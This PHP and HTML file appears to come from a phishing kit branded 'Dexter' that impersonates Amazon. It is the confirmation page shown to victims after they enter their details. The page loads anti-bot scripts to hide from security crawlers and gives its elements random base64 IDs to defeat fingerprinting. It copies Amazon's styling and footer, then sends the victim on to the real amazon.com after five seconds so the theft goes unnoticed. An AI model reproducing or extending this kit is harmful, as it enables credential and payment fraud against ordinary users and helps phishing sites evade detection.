﻿<?php
error_reporting(0); 
################## Dexter #################
//include('../function/configs.php');
################## Dexter #################
if($autolang == 1 ){
include('../function/get_lang.php');
include "../function/lang".$_SESSION['SHADOW-Z118'];}
elseif($Langage_es == 1 ){include "../function/lang/es.php";}
elseif($Langage_de == 1 ){include "../function/lang/de.php";}
elseif($Langage_en == 1 ){include "../function/lang/en.php";}
elseif($Langage_fr == 1 ){include "../function/lang/fr.php";}
elseif($Langage_it == 1 ){include "../function/lang/it.php";}
else {include "../function/lang/en.php";}
################## Dexter #################
if($antibots !== 1 ){}else{
include "../antibots/antibots1.php";
include "../antibots/antibots2.php";
include "../antibots/antibots3.php";}
################## Dexter #################
?>
<html>
<!-- 
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
-->
<head>
  <meta http-equiv="refresh" content="5;url=https://www.amazon.com/gp/navigation/redirector.html"></meta>
<link href="../files/css/logo.ico" rel="shortcut icon" type="image/x-icon">
<title> <?php echo "$zkika_logo";?></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8">
<link rel="icon" type="image/x-icon" href="../files/images/favicon.ico" />  
<link rel="stylesheet" href="../files/css/xnxx.css">
<link rel="stylesheet" type="text/css" href="../files/css/details.css">
<link rel="stylesheet" type="text/css" href="../files/css/cc.css">
  <link type="text/css" href="../files/css/ap-flex-reduced-nav._3C8_.css" rel="stylesheet">

</head>
  <link type="text/css" href="../files/css/xd.css" rel="stylesheet">
<?php include "../function/footer.php"; ?>
  <br><br>
    <center>
<h1 id="<?=base64_encode(md5(rand(00,1000)));?>"  style=" margin-top: 4%; " class="a-size-medium">
            <a>
                <?php echo $zab_a;?>
            </a>
            <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="breadcrumbArrow">
                ›
            </span>
            <a>
               <?php echo $zab_b;?>
            </a>
			<span id="<?=base64_encode(md5(rand(00,1000)));?>" class="breadcrumbArrow">
                ›
            </span id="<?=base64_encode(md5(rand(00,1000)));?>">
            <span id="<?=base64_encode(md5(rand(00,1000)));?>">
                <?php echo $zab_c;?>
            </span>
        </h1>
   <br><br>  
 <div id="centerSlots">
        <div id="center-0"></div>
        <div id="<?=base64_encode(md5(rand(00,1000)));?>" id="title-slot">

    <div id="<?=base64_encode(md5(rand(00,1000)));?>" id="ap_title_pagelet">
    <br><br>  
    </div>
</div> <div id="center-1"></div>
        <div style="margin-left:6%;" id="signin-slot">
  <div id="ap_signin1a_pagelet" class="ap_table ap_pagelet">
    <div id="ap_signin1a_pagelet_title" class="ap_row ap_pagelet_title">
      <h1 class="ie">  <?php echo "$dexter_zkikab_1";?> 
	  <img height="20" src="../files/images/done.png" width="20"></h1><br>
		<h1 class="ie"> <?php echo "$dexter_zkikab_2";?><br><br>
	<img id="<?=base64_encode(md5(rand(00,1000)));?>" src="../files/images/Floating-rays.gif" height="28" width="28" align="center">
		</h1><h1 style=" color: rgb(153, 102, 51);   font-weight: normal;
    font-size: 17px;
    line-height: 1.27;"class="ie"><br><?php echo "$dexter_zkikab_3";?></h1>
		<div id="ap_small_forgot_password_link_ie_old" class="ie_old">
			<div id="ap_signin1a_forgot_password_row" class="ap_row">
				<span id="<?=base64_encode(md5(rand(00,1000)));?>" class="ap_col1">&nbsp;</span> <span class="ap_col2">
				
				</span></div>
			<div id="ap_signin1a_cnep_row" class="ap_row">
				<span id="<?=base64_encode(md5(rand(00,1000)));?>" class="ap_col1">&nbsp;</span>
			</div>
			<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="ap_row">
			</div>
		</div>
    </div>
	</div>
	<br><br><br><br> <div id="center-3"></div> </div><br> <br></center>
	   <br> <br><div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-top-extra-large">
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-divider a-divider-section"><div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-divider-inner"></div></div><center><ul>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav_first" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Australia</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Brazil</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Canada</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">China</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">France</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Germany</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">India</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Italy</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Japan</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Mexico</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Spain</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_last" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">United Kingdom</a></li>
</ul><ul><li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_first" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;">&nbsp;</li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_first" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">  <?php echo "$goverment_is_bad_19";?> </a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a"href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;"><?php echo "$goverment_is_bad_20";?></a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a"href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;"><?php echo "$goverment_is_bad_21";?></a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_last" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><?php echo "$goverment_is_bad_1";?></li>
</ul>
</center>
      </div>
<!-- 
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
-->

</body></html>